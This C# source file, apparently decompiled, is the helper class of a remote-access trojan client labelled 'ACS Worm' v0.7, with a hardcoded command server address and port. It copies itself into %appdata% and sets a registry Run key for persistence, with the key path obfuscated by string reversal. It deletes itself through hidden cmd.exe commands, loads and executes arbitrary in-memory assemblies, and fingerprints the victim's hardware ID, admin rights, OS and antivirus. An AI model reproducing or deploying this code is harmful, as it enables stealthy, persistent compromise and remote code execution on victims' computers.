using System;
using System.Collections;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Reflection;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading.Tasks;
using Microsoft.Win32;

namespace Client;

internal class Helper
{
	public static string ip = "127.0.0.1";

	public static string port = "4444";

	public static string Nick = "ACS Worm";

	public static string version = "v0.7";

	public static string delay = "500";

	public static string installName = "ACS Worm";

	public static string installPath = "%appdata%";

	public static string mutex = "AAp7XlGwSI4rDD";

	public static void Install()
	{
		new Task(delegate
		{
			if (!(installName == "inN") && !(installPath == "inP"))
			{
				File.Copy(Assembly.GetExecutingAssembly().Location, Environment.ExpandEnvironmentVariables(installPath) + "\\" + installName + ".exe");
				RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(Reverse("nuR\\noisreKVtnerruC\\swodniW\\tfosKorciM\\ERAKWTFOS"), writable: true);
				registryKey.SetValue(installName, Environment.ExpandEnvironmentVariables(installPath) + "\\" + installName + ".exe");
			}
		}).Start();
	}

	public static void UnInstall()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(Reverse("nuR\\noisreKVtnerruC\\swodniW\\tfosKorciM\\ERAKWTFOS"), writable: true);
			registryKey.DeleteValue(installName, throwOnMissingValue: false);
			new Task(delegate
			{
				Process.Start(new ProcessStartInfo
				{
					Arguments = "/C timeout 1 & Del \"" + Environment.ExpandEnvironmentVariables(installPath) + "\\" + installName + ".exe\"",
					WindowStyle = ProcessWindowStyle.Hidden,
					CreateNoWindow = true,
					FileName = "cmd.exe"
				});
			}).Start();
		}
		catch
		{
		}
		Process.Start(new ProcessStartInfo
		{
			Arguments = "/C timeout 1 & Del \"" + Assembly.GetExecutingAssembly().Location + "\"",
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true,
			FileName = "cmd.exe"
		});
		Environment.Exit(0);
	}

	public static void Restart()
	{
		new Task(delegate
		{
			Process.Start(new ProcessStartInfo
			{
				Arguments = "/C timeout 2 & \"" + Assembly.GetExecutingAssembly().Location + "\"",
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				FileName = "cmd.exe"
			});
			Environment.Exit(0);
		}).Start();
	}

	public static void RunPe(byte[] bytes)
	{
		try
		{
			Assembly assembly = AppDomain.CurrentDomain.Load(bytes);
			MethodInfo entryPoint = assembly.EntryPoint;
			object obj = assembly.CreateInstance(entryPoint.Name);
			object[] array = new string[1];
			object[] parameters = array;
			if (entryPoint.GetParameters().Length == 0)
			{
				parameters = null;
			}
			entryPoint.Invoke(obj, parameters);
			Console.WriteLine("Lof");
		}
		catch (Exception ex)
		{
			throw new Exception(ex.Message);
		}
	}

	private static string Reverse(string s)
	{
		s = s.Replace("K", "");
		char[] array = s.ToCharArray();
		Array.Reverse((Array)array);
		return new string(array);
	}

	public static string HWID()
	{
		try
		{
			return GetHash(string.Concat(Environment.ProcessorCount, Environment.UserName, Environment.MachineName, Environment.OSVersion, new DriveInfo(Path.GetPathRoot(Environment.SystemDirectory)).TotalSize));
		}
		catch
		{
			return "Err HWID";
		}
	}

	private static string GetHash(string strToHash)
	{
		MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
		byte[] bytes = Encoding.ASCII.GetBytes(strToHash);
		bytes = mD5CryptoServiceProvider.ComputeHash(bytes);
		StringBuilder stringBuilder = new StringBuilder();
		byte[] array = bytes;
		byte[] array2 = array;
		foreach (byte b in array2)
		{
			stringBuilder.Append(b.ToString("x2"));
		}
		return stringBuilder.ToString().Substring(0, 20).ToUpper();
	}

	public static string Idmsg()
	{
		string text = (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) ? "[A] " : "");
		return Nick + "|" + HWID() + "|" + text + Environment.UserName + "|" + OS() + "|" + GetAvName() + "|" + version + "|" + DotNet();
	}

	private static string DotNet()
	{
		string text = "";
		if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Windows) + "\\Microsoft.NET\\Framework\\v4.0.30319"))
		{
			text += "4.0";
		}
		if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Windows) + "\\Microsoft.NET\\Framework\\v2.0.50727"))
		{
			text += " 2.0";
		}
		return (text == "") ? "N/A" : text;
	}

	private static string OS()
	{
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		//IL_000d: Expected O, but got Unknown
		string text = "SELECT * FROM Win32_OperatingSystem";
		ManagementObjectSearcher val = new ManagementObjectSearcher(text);
		ManagementObject val2 = ((IEnumerable)val.Get()).Cast<ManagementObject>().FirstOrDefault();
		string text2 = ((ManagementBaseObject)val2).get_Properties().get_Item("Caption").get_Value()
			.ToString();
		string text3 = ((ManagementBaseObject)val2).get_Properties().get_Item("Version").get_Value()
			.ToString();
		return text2.ToString().Replace("Microsoft ", "") + " " + text3.ToString().Split(new char[1] { '.' })[2];
	}

	public static string Encrypt(string data)
	{
		return data;
	}

	public static string Decrypt(string data)
	{
		return data;
	}

	private static string GetAvName()
	{
		//IL_0023: Unknown result type (might be due to invalid IL or missing references)
		//IL_0029: Expected O, but got Unknown
		string text = "";
		try
		{
			bool flag = false;
			string text2 = "\\\\" + Environment.MachineName + "\\root\\SecurityCenter2";
			ManagementObjectSearcher val = new ManagementObjectSearcher(text2, "SELECT * FROM AntivirusProduct");
			ManagementObjectCollection val2 = val.Get();
			text = "";
			ManagementObjectEnumerator enumerator = val2.GetEnumerator();
			try
			{
				while (enumerator.MoveNext())
				{
					ManagementBaseObject current = enumerator.get_Current();
					if (current.GetPropertyValue("displayName").ToString()!.Equals("Windows Defender"))
					{
						flag = true;
					}
					if (current.GetPropertyValue("displayName").ToString() != "Windows Defender")
					{
						text = current.GetPropertyValue("displayName").ToString();
					}
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			if (text.Equals(string.Empty) && flag)
			{
				text = "Windows Defender";
			}
			if (text == "")
			{
				text = "N/A";
			}
		}
		catch (Exception)
		{
			text = "N/A";
		}
		return text;
	}
}
